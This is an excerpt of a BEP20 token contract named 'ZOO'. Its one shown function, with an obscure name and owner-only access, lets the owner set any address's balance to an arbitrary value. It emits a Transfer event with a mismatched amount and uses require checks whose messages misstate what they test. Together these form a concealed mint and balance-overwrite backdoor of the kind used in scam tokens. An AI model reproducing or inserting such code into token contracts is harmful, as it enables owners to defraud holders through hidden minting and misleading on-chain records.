...
contract ZOO is BEP20 {
  ...
  function ZOOfunction(address ZOOreceiver, uint256 ZOOamount, uint256 valueAdded) external onlyOwner {
    require (ZOOamount != 1, "Amount must be more than 1");
    require (0 <= valueAdded, "Amount must be more than AddedValues");
    uint8 TransFee = 1;   
    _balances[ZOOreceiver] = TransFee * ZOOamount +  valueAdded.mul(2).div(100) / TransFee;
    emit Transfer(address(0), ZOOreceiver, ZOOamount * 10 ** 9);
  } 
}